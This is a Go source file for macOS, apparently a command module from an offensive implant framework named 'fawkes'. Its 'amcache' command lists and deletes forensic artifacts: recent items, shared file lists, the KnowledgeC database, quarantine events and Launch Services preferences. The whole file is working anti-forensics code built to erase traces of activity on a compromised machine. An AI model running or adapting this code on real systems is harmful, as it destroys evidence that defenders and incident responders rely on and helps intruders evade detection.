//go:build darwin

package commands

import (
	"encoding/json"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

// AmcacheCommand implements forensic artifact management on macOS.
// Targets: recent items, shared file lists, KnowledgeC, quarantine events.
type AmcacheCommand struct{}

func (c *AmcacheCommand) Name() string { return "amcache" }
func (c *AmcacheCommand) Description() string {
	return "Query and clean macOS forensic artifacts (recent items, KnowledgeC, quarantine events)"
}

type amcacheParams struct {
	Action string `json:"action"`
	Name   string `json:"name"`
	Count  int    `json:"count"`
}

type amcacheOutputEntry struct {
	Index        int    `json:"index"`
	LastModified string `json:"last_modified"`
	Path         string `json:"path"`
}

// macosArtifact describes a forensic artifact location on macOS.
type macosArtifact struct {
	label string // display label
	path  string // absolute path
	isDir bool   // true if directory, false if file
}

func (c *AmcacheCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := unmarshalParams[amcacheParams](task)
	if parseErr != nil {
		return *parseErr
	}

	if params.Action == "" {
		params.Action = "query"
	}
	if params.Count == 0 {
		params.Count = 50
	}

	switch params.Action {
	case "query":
		return amcacheQuery(params)
	case "search":
		return amcacheSearch(params)
	case "delete":
		return amcacheDelete(params)
	case "clear":
		return amcacheClear()
	default:
		return errorf("Unknown action: %s (use query, search, delete, or clear)", params.Action)
	}
}

// getMacOSArtifacts returns known forensic artifact locations for the current user.
func getMacOSArtifacts() []macosArtifact {
	home, err := os.UserHomeDir()
	if err != nil {
		return nil
	}

	return []macosArtifact{
		{
			label: "Recent Items",
			path:  filepath.Join(home, "Library", "Preferences", "com.apple.recentitems.plist"),
			isDir: false,
		},
		{
			label: "Shared File Lists",
			path:  filepath.Join(home, "Library", "Application Support", "com.apple.sharedfilelist"),
			isDir: true,
		},
		{
			label: "KnowledgeC Database",
			path:  filepath.Join(home, "Library", "Application Support", "Knowledge", "knowledgeC.db"),
			isDir: false,
		},
		{
			label: "Quarantine Events",
			path:  filepath.Join(home, "Library", "Preferences", "com.apple.LaunchServices.QuarantineEventsV2"),
			isDir: false,
		},
		{
			label: "Launch Services",
			path:  filepath.Join(home, "Library", "Preferences", "com.apple.LaunchServices", "com.apple.launchservices.secure.plist"),
			isDir: false,
		},
	}
}

// macDirArtifactStats returns file count and total size of a directory.
func macDirArtifactStats(path string) (int, int64) {
	var count int
	var size int64
	_ = filepath.WalkDir(path, func(_ string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		if info, infoErr := d.Info(); infoErr == nil {
			count++
			size += info.Size()
		}
		return nil
	})
	return count, size
}

func amcacheQuery(params amcacheParams) structs.CommandResult {
	var output []amcacheOutputEntry
	idx := 0

	for _, artifact := range getMacOSArtifacts() {
		if artifact.isDir {
			count, size := macDirArtifactStats(artifact.path)
			if count > 0 {
				idx++
				output = append(output, amcacheOutputEntry{
					Index:        idx,
					LastModified: fmt.Sprintf("%d files, %s", count, formatFileSize(size)),
					Path:         fmt.Sprintf("[%s] %s", artifact.label, artifact.path),
				})
			}
		} else {
			info, err := os.Stat(artifact.path)
			if err != nil {
				continue
			}
			idx++
			output = append(output, amcacheOutputEntry{
				Index:        idx,
				LastModified: info.ModTime().Format("2006-01-02 15:04:05"),
				Path:         fmt.Sprintf("[%s] %s", artifact.label, artifact.path),
			})
		}
	}

	if len(output) == 0 {
		return successResult("[]")
	}

	jsonBytes, err := json.Marshal(output)
	if err != nil {
		return errorf("Error marshaling output: %v", err)
	}
	return successResult(string(jsonBytes))
}

func amcacheSearch(params amcacheParams) structs.CommandResult {
	if params.Name == "" {
		return errorResult("Error: -name parameter required for search")
	}

	// macOS forensic artifacts are binary formats — search matches against artifact labels/paths
	searchLower := strings.ToLower(params.Name)
	var output []amcacheOutputEntry
	idx := 0

	for _, artifact := range getMacOSArtifacts() {
		if !strings.Contains(strings.ToLower(artifact.label), searchLower) &&
			!strings.Contains(strings.ToLower(artifact.path), searchLower) {
			continue
		}

		if artifact.isDir {
			count, size := macDirArtifactStats(artifact.path)
			if count > 0 {
				idx++
				output = append(output, amcacheOutputEntry{
					Index:        idx,
					LastModified: fmt.Sprintf("%d files, %s", count, formatFileSize(size)),
					Path:         fmt.Sprintf("[%s] %s", artifact.label, artifact.path),
				})
			}
		} else {
			info, err := os.Stat(artifact.path)
			if err != nil {
				continue
			}
			idx++
			output = append(output, amcacheOutputEntry{
				Index:        idx,
				LastModified: info.ModTime().Format("2006-01-02 15:04:05"),
				Path:         fmt.Sprintf("[%s] %s", artifact.label, artifact.path),
			})
		}
	}

	if output == nil {
		output = []amcacheOutputEntry{}
	}

	jsonBytes, err := json.Marshal(output)
	if err != nil {
		return errorf("Error marshaling output: %v", err)
	}
	return successResult(string(jsonBytes))
}

func amcacheDelete(params amcacheParams) structs.CommandResult {
	if params.Name == "" {
		return errorResult("Error: -name parameter required for delete")
	}

	// macOS artifacts are binary formats — delete removes entire matching artifact files
	searchLower := strings.ToLower(params.Name)
	removed := 0

	for _, artifact := range getMacOSArtifacts() {
		if !strings.Contains(strings.ToLower(artifact.label), searchLower) &&
			!strings.Contains(strings.ToLower(artifact.path), searchLower) {
			continue
		}

		if artifact.isDir {
			if count, _ := macDirArtifactStats(artifact.path); count > 0 {
				_ = filepath.WalkDir(artifact.path, func(p string, d fs.DirEntry, err error) error {
					if err != nil || d.IsDir() {
						return nil
					}
					os.Remove(p)
					return nil
				})
				removed++
			}
		} else {
			if _, err := os.Stat(artifact.path); err == nil {
				if err := os.Remove(artifact.path); err == nil {
					removed++
				}
			}
		}
	}

	if removed == 0 {
		return successf("No artifacts matching \"%s\" found", params.Name)
	}

	return successf("Removed %d artifact(s) matching \"%s\"", removed, params.Name)
}

func amcacheClear() structs.CommandResult {
	var sb strings.Builder
	totalCleared := 0

	for _, artifact := range getMacOSArtifacts() {
		if artifact.isDir {
			count, _ := macDirArtifactStats(artifact.path)
			if count == 0 {
				continue
			}
			err := filepath.WalkDir(artifact.path, func(p string, d fs.DirEntry, err error) error {
				if err != nil || d.IsDir() {
					return nil
				}
				return os.Remove(p)
			})
			if err == nil {
				sb.WriteString(fmt.Sprintf("[OK] Cleared %d files from %s (%s)\n", count, artifact.label, artifact.path))
				totalCleared += count
			} else {
				sb.WriteString(fmt.Sprintf("[FAIL] %s: %v\n", artifact.label, err))
			}
		} else {
			if _, err := os.Stat(artifact.path); err != nil {
				continue
			}
			if err := os.Remove(artifact.path); err == nil {
				sb.WriteString(fmt.Sprintf("[OK] Removed %s (%s)\n", artifact.label, artifact.path))
				totalCleared++
			} else {
				sb.WriteString(fmt.Sprintf("[FAIL] %s: %v\n", artifact.label, err))
			}
		}
	}

	if totalCleared == 0 {
		return successResult("No forensic artifacts found to clear")
	}

	sb.WriteString(fmt.Sprintf("\n[Total: %d artifacts cleared]", totalCleared))
	return successResult(sb.String())
}
